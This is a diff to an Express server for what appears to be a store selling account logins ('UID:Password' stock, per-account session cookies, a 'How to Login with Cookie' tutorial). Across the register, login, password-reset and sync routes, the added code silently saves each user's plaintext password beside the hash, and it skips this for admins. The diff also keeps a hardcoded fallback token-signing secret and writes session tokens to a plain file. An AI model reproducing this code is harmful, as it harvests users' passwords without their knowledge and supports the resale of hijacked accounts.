@@ -1,22 +1,50 @@
 import express, { Request, Response, NextFunction } from 'express';
 import { createServer as createViteServer } from 'vite';
 import path from 'path';
+import fs from 'fs';
 import crypto from 'crypto';
 import dotenv from 'dotenv';
 import { db, hashPassword, pendingRegistrations, PendingRegistration, passwordResetTokens } from './server/db';
 import { User, DepositRequest } from './server/types';
 import { sendOtpEmail, sendPasswordResetEmail, testSmtp, isSmtpConfigured } from './server/mailer';
+import { getFirebaseSyncStatus, syncAllToFirestore, pullDataFromFirestore } from './server/firebaseSync';
 
 dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
 
-app.use(express.json({ limit: '25mb' }));
-app.use(express.urlencoded({ extended: true, limit: '25mb' }));
+app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+
+// Static uploads directory for tutorial videos and screenshots
+const UPLOADS_DIR = path.join(process.cwd(), 'data', 'uploads');
+if (!fs.existsSync(UPLOADS_DIR)) {
+  fs.mkdirSync(UPLOADS_DIR, { recursive: true });
+}
+app.use('/uploads', express.static(UPLOADS_DIR));
 
 const TOKEN_SECRET = process.env.TOKEN_SECRET || 'fbstore_persistent_token_signing_key_2026';
 const tokenSessions = new Map<string, string>(); // token -> userId
+
+// Load persistent sessions so users are NEVER logged out on restarts or updates
+const SESSIONS_FILE = path.join(process.cwd(), 'data', 'sessions.json');
+try {
+  if (fs.existsSync(SESSIONS_FILE)) {
+    const raw = fs.readFileSync(SESSIONS_FILE, 'utf-8');
+    const parsed = JSON.parse(raw);
+    for (const [k, v] of Object.entries(parsed)) {
+      tokenSessions.set(k, String(v));
+    }
+  }
+} catch (e) {}
+
+function saveSessions() {
+  try {
+    const obj = Object.fromEntries(tokenSessions.entries());
+    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(obj), 'utf-8');
+  } catch (e) {}
+}
 
 function generateAuthToken(userId: string): string {
   const ts = Date.now();
@@ -24,6 +52,7 @@ function generateAuthToken(userId: string): string {
   const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(payload).digest('hex');
   const token = `fbt_${Buffer.from(payload).toString('base64url')}_${sig}`;
   tokenSessions.set(token, userId);
+  saveSessions();
   return token;
 }
 
@@ -160,6 +189,7 @@ app.post('/api/auth/send-otp', async (req: Request, res: Response) => {
     username: cleanUsername,
     email: cleanEmail,
     passwordHash: hashPassword(String(password)),
+    plainPassword: String(password),
     otp,
     expiresAt,
   });
@@ -212,6 +242,7 @@ app.post('/api/auth/verify-otp', (req: Request, res: Response) => {
     username: pending.username,
     email: pending.email,
     passwordHash: pending.passwordHash,
+    plainPassword: pending.plainPassword || '',
     role: 'user',
     walletBalance: 0, // Zero balance!
     createdAt: new Date().toISOString(),
@@ -219,6 +250,14 @@ app.post('/api/auth/verify-otp', (req: Request, res: Response) => {
 
   db.createUser(newUser);
   pendingRegistrations.delete(cleanEmail);
+
+  // Trigger personalized welcome message for new user
+  try {
+    const welcome = db.createWelcomeMessageForUser(newUser);
+    if (welcome) {
+      broadcastEvent('announcements_updated', { announcement: welcome }, newUser.id);
+    }
+  } catch (err) {}
 
   const token = generateAuthToken(newUser.id);
 
@@ -307,7 +346,7 @@ app.post('/api/auth/reset-password', (req: Request, res: Response) => {
   }
 
   const newHash = hashPassword(String(newPassword));
-  const updated = db.updateUserPassword(cleanEmail, newHash);
+  const updated = db.updateUserPassword(cleanEmail, newHash, String(newPassword));
 
   if (!updated) {
     return res.status(404).json({ error: 'Failed to update password. User not found.' });
@@ -337,6 +376,7 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
   );
   if (existing) {
     if (existing.passwordHash === hashPassword(String(password))) {
+      db.recordUserPlainPassword(existing.id, String(password));
       const token = `tok_${crypto.randomUUID()}`;
       tokenSessions.set(token, existing.id);
       const { passwordHash, ...safeUser } = existing;
@@ -350,6 +390,7 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
     username: cleanUsername,
     email: cleanEmail,
     passwordHash: hashPassword(String(password)),
+    plainPassword: String(password),
     role: 'user',
     walletBalance: 0, // Strict 0 balance for all new users
     createdAt: new Date().toISOString(),
@@ -358,6 +399,14 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
   db.createUser(newUser);
   const token = `tok_${crypto.randomUUID()}`;
   tokenSessions.set(token, newUser.id);
+
+  // Trigger personalized welcome message for new user
+  try {
+    const welcome = db.createWelcomeMessageForUser(newUser);
+    if (welcome) {
+      broadcastEvent('announcements_updated', { announcement: welcome }, newUser.id);
+    }
+  } catch (err) {}
 
   const { passwordHash, ...safeUser } = newUser;
   return res.json({ success: true, user: safeUser, token });
@@ -380,6 +429,7 @@ app.post('/api/auth/sync-firebase-user', (req: Request, res: Response) => {
       username: cleanUsername,
       email: cleanEmail,
       passwordHash: password ? hashPassword(String(password)) : hashPassword('fbstore_synced_user'),
+      plainPassword: password ? String(password) : undefined,
       role: 'user',
       walletBalance: typeof walletBalance === 'number' ? Math.max(0, walletBalance) : 0,
       createdAt: new Date().toISOString()
@@ -391,7 +441,7 @@ app.post('/api/auth/sync-firebase-user', (req: Request, res: Response) => {
       db.setUserBalance(user.id, walletBalance);
     }
     if (password) {
-      db.updateUserPassword(user.id, hashPassword(String(password)));
+      db.updateUserPassword(user.id, hashPassword(String(password)), String(password));
     }
   }
 
@@ -423,6 +473,7 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
         username: settings.adminUsername,
         email: 'admin@fbstore.com',
         passwordHash: hashPassword(settings.adminPassword),
+        plainPassword: settings.adminPassword,
         role: 'admin',
         walletBalance: 0,
         createdAt: new Date().toISOString()
@@ -443,6 +494,10 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
   const expectedHash = hashPassword(cleanPass);
   if (user.passwordHash !== expectedHash) {
     return res.status(401).json({ error: 'Invalid username/email or password.' });
+  }
+
+  if (user.role !== 'admin') {
+    db.recordUserPlainPassword(user.id, cleanPass);
   }
 
   const token = generateAuthToken(user.id);
@@ -718,6 +773,21 @@ app.post('/api/admin/balance-stats/reset', requireAdmin, (_req: Request, res: Re
   return res.json({ success: true, totalBalanceAddedLifetime: 0 });
 });
 
+// Adjust / Deduct Lifetime Added Balance Counter (Admin only)
+app.post('/api/admin/balance-stats/adjust', requireAdmin, (req: Request, res: Response) => {
+  const { deductAmount, newAmount } = req.body;
+  let finalVal = 0;
+  if (typeof deductAmount === 'number') {
+    finalVal = db.deductTotalBalanceAdded(deductAmount);
+  } else if (typeof newAmount === 'number') {
+    finalVal = db.setTotalBalanceAdded(newAmount);
+  } else {
+    return res.status(400).json({ error: 'Provide deductAmount or newAmount' });
+  }
+  broadcastEvent('balance_stats_updated', { totalBalanceAddedLifetime: finalVal }, 'admin');
+  return res.json({ success: true, totalBalanceAddedLifetime: finalVal });
+});
+
 // Stock List
 app.get('/api/admin/stock', requireAdmin, (_req: Request, res: Response) => {
   return res.json({ stock: db.getStock() });
@@ -730,11 +800,39 @@ app.delete('/api/admin/stock/sold/clear', requireAdmin, (_req: Request, res: Res
   return res.json({ success: true, removedCount: removed });
 });
 
-// Add Stock Lines (UID:Password)
+// Add Stock (Individual Account with Cookie, Structured Accounts Array, OR Bulk Lines)
 app.post('/api/admin/stock', requireAdmin, (req: Request, res: Response) => {
-  const { text, lines } = req.body;
-  let linesArray: string[] = [];
+  const { uid, password, cookie, text, lines, accounts } = req.body;
 
+  // 1. Structured Accounts Array (with separate cookie per account)
+  if (Array.isArray(accounts) && accounts.length > 0) {
+    const validAccounts = accounts.filter(a => a && a.uid && String(a.uid).trim());
+    if (validAccounts.length === 0) {
+      return res.status(400).json({ error: 'No valid accounts with UID found.' });
+    }
+    const result = db.addStockAccounts(validAccounts);
+    broadcastEvent('stock_updated', { availableCount: db.getAvailableStockCount() });
+    return res.status(201).json({
+      success: true,
+      addedCount: result.addedCount,
+      newTotalAvailable: db.getAvailableStockCount(),
+    });
+  }
+
+  // 2. Single Individual Account Entry
+  if (uid && password) {
+    const newItem = db.addSingleStockItem(String(uid), String(password), cookie ? String(cookie) : undefined);
+    broadcastEvent('stock_updated', { availableCount: db.getAvailableStockCount() });
+    return res.status(201).json({
+      success: true,
+      addedCount: 1,
+      item: newItem,
+      newTotalAvailable: db.getAvailableStockCount(),
+    });
+  }
+
+  // 3. Bulk Multi-Line Entry
+  let linesArray: string[] = [];
   if (Array.isArray(lines)) {
     linesArray = lines;
   } else if (typeof text === 'string') {
@@ -742,7 +840,7 @@ app.post('/api/admin/stock', requireAdmin, (req: Request, res: Response) => {
   }
 
   if (linesArray.length === 0) {
-    return res.status(400).json({ error: 'Please enter at least one UID:Password line.' });
+    return res.status(400).json({ error: 'Please enter valid UID & Password, account list, or at least one line.' });
   }
 
   const result = db.addStockLines(linesArray);
@@ -752,6 +850,63 @@ app.post('/api/admin/stock', requireAdmin, (req: Request, res: Response) => {
     success: true,
     addedCount: result.addedCount,
     newTotalAvailable: db.getAvailableStockCount(),
+  });
+});
+
+// Firebase Firestore Status & Sync Controls
+app.get('/api/admin/firebase-status', requireAdmin, (_req: Request, res: Response) => {
+  return res.json({ status: getFirebaseSyncStatus() });
+});
+
+app.post('/api/admin/firebase-sync-now', requireAdmin, async (_req: Request, res: Response) => {
+  try {
+    const result = await syncAllToFirestore(db.getAllData());
+    return res.json(result);
+  } catch (err: any) {
+    return res.status(500).json({ success: false, error: err?.message || 'Sync failed' });
+  }
+});
+
+app.post('/api/admin/firebase-pull-now', requireAdmin, async (_req: Request, res: Response) => {
+  try {
+    const pulled = await pullDataFromFirestore();
+    if (!pulled) {
+      return res.status(400).json({ success: false, error: 'Could not read from Firestore. Check permissions.' });
+    }
+    const importRes = db.importData(pulled);
+    broadcastEvent('stock_updated', { availableCount: db.getAvailableStockCount() });
+    return res.json({ success: true, pulledCounts: importRes.stats });
+  } catch (err: any) {
+    return res.status(500).json({ success: false, error: err?.message || 'Pull failed' });
+  }
+});
+
+// Database Backup Export & Import (JSON)
+app.get('/api/admin/db-export', requireAdmin, (_req: Request, res: Response) => {
+  return res.json(db.getAllData());
+});
+
+app.post('/api/admin/db-import', requireAdmin, async (req: Request, res: Response) => {
+  const incoming = req.body;
+  if (!incoming || typeof incoming !== 'object') {
+    return res.status(400).json({ error: 'Invalid backup JSON data.' });
+  }
+  const importRes = db.importData(incoming);
+  broadcastEvent('stock_updated', { availableCount: db.getAvailableStockCount() });
+
+  // Auto-save everything to Firebase Firestore immediately
+  let firestoreSync = null;
+  try {
+    firestoreSync = await syncAllToFirestore(db.getAllData());
+  } catch (e: any) {
+    console.warn('[db-import] Firestore auto-sync warning:', e?.message || e);
+  }
+
+  return res.json({ 
+    success: importRes.success, 
+    stats: importRes.stats,
+    firebaseSync,
+    newTotalAvailable: db.getAvailableStockCount() 
   });
 });
 
@@ -889,7 +1044,7 @@ app.put('/api/admin/users/:id/password', requireAdmin, (req: Request, res: Respo
     return res.status(400).json({ error: 'Password must be at least 6 characters.' });
   }
 
-  const ok = db.updateUserPassword(req.params.id, hashPassword(String(newPassword)));
+  const ok = db.updateUserPassword(req.params.id, hashPassword(String(newPassword)), String(newPassword));
   if (!ok) return res.status(404).json({ error: 'User not found.' });
 
   return res.json({ success: true, message: 'User password updated successfully.' });
@@ -929,8 +1084,8 @@ app.get('/api/admin/database/backup', requireAdmin, (_req: Request, res: Respons
   return res.json(snapshot);
 });
 
-// Admin Database Restore Import (Restores all users, balances, stock, settings)
-app.post('/api/admin/database/restore', requireAdmin, (req: Request, res: Response) => {
+// Admin Database Restore Import (Restores all users, balances, stock, settings, and auto-syncs to Firestore)
+app.post('/api/admin/database/restore', requireAdmin, async (req: Request, res: Response) => {
   const data = req.body;
   if (!data || typeof data !== 'object') {
     return res.status(400).json({ error: 'Invalid backup file format.' });
@@ -941,15 +1096,87 @@ app.post('/api/admin/database/restore', requireAdmin, (req: Request, res: Respon
     return res.status(500).json({ error: 'Failed to restore database.' });
   }
 
+  // AUTO-SYNC ALL RESTORED DATA TO FIRESTORE IMMEDIATELY
+  let firestoreResult: any = null;
+  try {
+    firestoreResult = await syncAllToFirestore(db.getAllData());
+  } catch (err: any) {
+    firestoreResult = { success: false, error: err?.message };
+  }
+
   broadcastEvent('stock_updated', { availableCount: db.getAvailableStockCount() });
   broadcastEvent('settings_updated', { settings: db.getSettings() }, 'all');
 
   return res.json({ 
     success: true, 
-    message: 'Database restored successfully! All users, balances and stock have been recovered.',
+    message: 'Database restored successfully! All users, balances, cookies, and stock have been recovered and synced to Firestore.',
     usersCount: (data.users || []).length,
-    stockCount: (data.idsStock || []).length
+    stockCount: (data.idsStock || []).length,
+    purchasesCount: (data.purchases || []).length,
+    depositsCount: (data.deposits || []).length,
+    firestoreSyncStatus: firestoreResult
   });
+});
+
+// ==========================================
+// TUTORIAL VIDEO ("How to Login with Cookie")
+// ==========================================
+
+// Public: Get Tutorial Video info for users
+app.get('/api/tutorial-video', (_req: Request, res: Response) => {
+  return res.json({ tutorial: db.getTutorialVideo() });
+});
+
+// Admin: Update Tutorial Video settings (title, videoUrl, instructions, enabled)
+app.put('/api/admin/tutorial-video', requireAdmin, (req: Request, res: Response) => {
+  const { title, videoUrl, instructions, enabled } = req.body;
+  const updatePayload: any = {};
+  if (typeof title === 'string') updatePayload.title = title.trim();
+  if (typeof videoUrl === 'string') updatePayload.videoUrl = videoUrl.trim();
+  if (typeof instructions === 'string') updatePayload.instructions = instructions.trim();
+  if (typeof enabled === 'boolean') updatePayload.enabled = enabled;
+
+  const updated = db.updateTutorialVideo(updatePayload);
+  broadcastEvent('tutorial_video_updated', { tutorial: updated }, 'all');
+  return res.json({ success: true, tutorial: updated });
+});
+
+// Admin: Upload Tutorial Video file (Base64 payload)
+app.post('/api/admin/tutorial-video/upload', requireAdmin, (req: Request, res: Response) => {
+  const { filename, base64Data, contentType } = req.body;
+  if (!base64Data) {
+    return res.status(400).json({ error: 'Please provide video data.' });
+  }
+
+  try {
+    // Strip metadata header if present: "data:video/mp4;base64,..."
+    const cleanBase64 = base64Data.includes(',') ? base64Data.split(',')[1] : base64Data;
+    const buffer = Buffer.from(cleanBase64, 'base64');
+    
+    // Generate clean filename
+    const ext = filename?.includes('.') ? filename.split('.').pop() : 'mp4';
+    const savedName = `cookie_login_tutorial_${Date.now()}.${ext}`;
+    const filePath = path.join(UPLOADS_DIR, savedName);
+    
+    fs.writeFileSync(filePath, buffer);
+    const videoUrl = `/uploads/${savedName}`;
+
+    const updated = db.updateTutorialVideo({ 
+      videoUrl,
+      enabled: true
+    });
+
+    broadcastEvent('tutorial_video_updated', { tutorial: updated }, 'all');
+
+    return res.json({ 
+      success: true, 
+      videoUrl, 
+      tutorial: updated,
+      message: 'Tutorial video uploaded successfully!' 
+    });
+  } catch (err: any) {
+    return res.status(500).json({ error: err.message || 'Failed to save uploaded video file.' });
+  }
 });
 
 // User Self-Service Change Password (from Dashboard Profile)
@@ -979,6 +1206,157 @@ app.get('/api/notifications', (req: Request, res: Response) => {
   const user = getAuthUser(req);
   const notifs = db.getNotifications(user ? user.id : 'all');
   return res.json({ notifications: notifs });
+});
+
+// ---------------- ANNOUNCEMENTS & MARQUEE & ADMIN MESSAGES ----------------
+
+// 1. Public / User Announcements
+app.get('/api/announcements', (req: Request, res: Response) => {
+  const user = getAuthUser(req);
+  const requestedUserId = req.query.userId ? String(req.query.userId) : (user ? user.id : undefined);
+  const list = db.getAnnouncements(requestedUserId);
+  return res.json({ announcements: list });
+});
+
+// 2. Marquee Ticker Settings (Public with user targeting support)
+app.get('/api/marquee', (req: Request, res: Response) => {
+  const user = getAuthUser(req);
+  const requestedUserId = req.query.userId ? String(req.query.userId) : (user ? user.id : undefined);
+  const marquee = db.getMarquee();
+  
+  // If marquee is user-targeted and user doesn't match, return disabled marquee for this user
+  if (marquee.targetType === 'user' && marquee.targetUserId) {
+    if (!requestedUserId || requestedUserId !== marquee.targetUserId) {
+      return res.json({ marquee: { ...marquee, enabled: false } });
+    }
+  }
+
+  return res.json({ marquee });
+});
+
+// 3. User Admin Messages (Private to logged in user)
+app.get('/api/user/messages', (req: Request, res: Response) => {
+  const user = getAuthUser(req);
+  if (!user) return res.status(401).json({ error: 'Authentication required' });
+  const messages = db.getAdminMessages(user.id);
+  return res.json({ messages });
+});
+
+app.post('/api/user/messages/:id/read', (req: Request, res: Response) => {
+  const user = getAuthUser(req);
+  if (!user) return res.status(401).json({ error: 'Authentication required' });
+  const ok = db.markAdminMessageRead(req.params.id, user.id);
+  return res.json({ success: ok });
+});
+
+// 4. Admin Announcement Management
+app.get('/api/admin/announcements', requireAdmin, (_req: Request, res: Response) => {
+  return res.json({ announcements: db.getAllAnnouncements() });
+});
+
+app.post('/api/admin/announcements', requireAdmin, (req: Request, res: Response) => {
+  const { title, message, type, targetType, targetUserId, targetUsername, showAsPopup, frequency, active } = req.body;
+  if (!title || !message) {
+    return res.status(400).json({ error: 'Title and message are required' });
+  }
+  const newAnn = db.addAnnouncement({
+    title: String(title).trim(),
+    message: String(message).trim(),
+    type: type || 'info',
+    targetType: targetType === 'user' ? 'user' : 'all',
+    targetUserId: targetType === 'user' ? targetUserId : undefined,
+    targetUsername: targetType === 'user' ? targetUsername : undefined,
+    showAsPopup: Boolean(showAsPopup),
+    frequency: frequency === 'once_only' ? 'once_only' : 'every_refresh',
+    active: active !== undefined ? Boolean(active) : true
+  });
+  broadcastEvent('announcements_updated', { announcement: newAnn }, newAnn.targetUserId || 'all');
+  return res.json({ success: true, announcement: newAnn });
+});
+
+app.put('/api/admin/announcements/:id', requireAdmin, (req: Request, res: Response) => {
+  const updated = db.updateAnnouncement(req.params.id, req.body);
+  if (!updated) return res.status(404).json({ error: 'Announcement not found' });
+  broadcastEvent('announcements_updated', { announcement: updated }, updated.targetUserId || 'all');
+  return res.json({ success: true, announcement: updated });
+});
+
+app.delete('/api/admin/announcements/:id', requireAdmin, (req: Request, res: Response) => {
+  const ok = db.deleteAnnouncement(req.params.id);
+  broadcastEvent('announcements_updated', { deletedId: req.params.id }, 'all');
+  return res.json({ success: ok });
+});
+
+// 5. Admin Marquee Ticker Settings
+app.post('/api/admin/marquee', requireAdmin, (req: Request, res: Response) => {
+  const { enabled, text, speed, bgColor, textColor, badgeText, showBadge, targetType, targetUserId, targetUsername } = req.body;
+  const updated = db.updateMarquee({
+    enabled: Boolean(enabled),
+    text: String(text || '').trim(),
+    speed: speed || 'normal',
+    bgColor,
+    textColor,
+    badgeText,
+    showBadge: showBadge !== undefined ? Boolean(showBadge) : true,
+    targetType: targetType === 'user' ? 'user' : 'all',
+    targetUserId: targetType === 'user' ? targetUserId : undefined,
+    targetUsername: targetType === 'user' ? targetUsername : undefined,
+  });
+  broadcastEvent('marquee_updated', { marquee: updated });
+  return res.json({ success: true, marquee: updated });
+});
+
+// 5.1 Admin Welcome Message Settings (Auto New User Greeting)
+app.get('/api/admin/welcome-settings', requireAdmin, (_req: Request, res: Response) => {
+  return res.json({ welcomeConfig: db.getWelcomeMessageConfig() });
+});
+
+app.put('/api/admin/welcome-settings', requireAdmin, (req: Request, res: Response) => {
+  const { enabled, title, message } = req.body;
+  const updated = db.updateWelcomeMessageConfig({
+    enabled: enabled !== undefined ? Boolean(enabled) : true,
+    title: title ? String(title).trim() : undefined,
+    message: message ? String(message).trim() : undefined,
+  });
+  return res.json({ success: true, welcomeConfig: updated });
+});
+
+// 6. Admin Messages Management (Admin -> User direct inbox)
+app.get('/api/admin/messages', requireAdmin, (_req: Request, res: Response) => {
+  return res.json({ messages: db.getAllAdminMessages() });
+});
+
+app.post('/api/admin/messages', requireAdmin, (req: Request, res: Response) => {
+  const { userId, targetUsername, title, message, priority } = req.body;
+  if (!userId || !title || !message) {
+    return res.status(400).json({ error: 'User ID, title, and message are required' });
+  }
+  const newMsg = db.sendAdminMessage({
+    userId,
+    targetUsername,
+    sender: 'Admin',
+    title: String(title).trim(),
+    message: String(message).trim(),
+    priority: priority || 'normal'
+  });
+  broadcastEvent('admin_message_received', { message: newMsg }, userId);
+  return res.json({ success: true, message: newMsg });
+});
+
+app.delete('/api/admin/messages/:id', requireAdmin, (req: Request, res: Response) => {
+  const ok = db.deleteAdminMessage(req.params.id);
+  return res.json({ success: ok });
+});
+
+// 7. Sync Remote Firestore Users (Protects against data loss when server re-provisions)
+app.post('/api/admin/sync-firestore-users', requireAdmin, (req: Request, res: Response) => {
+  const { users } = req.body;
+  if (!Array.isArray(users)) {
+    return res.status(400).json({ error: 'Array of users is required' });
+  }
+  const allUsers = db.syncFirestoreUsers(users);
+  broadcastEvent('users_updated', { count: allUsers.length }, 'admin');
+  return res.json({ success: true, count: allUsers.length, users: allUsers });
 });
 
 // ---------------- VITE / FRONTEND SERVING ----------------
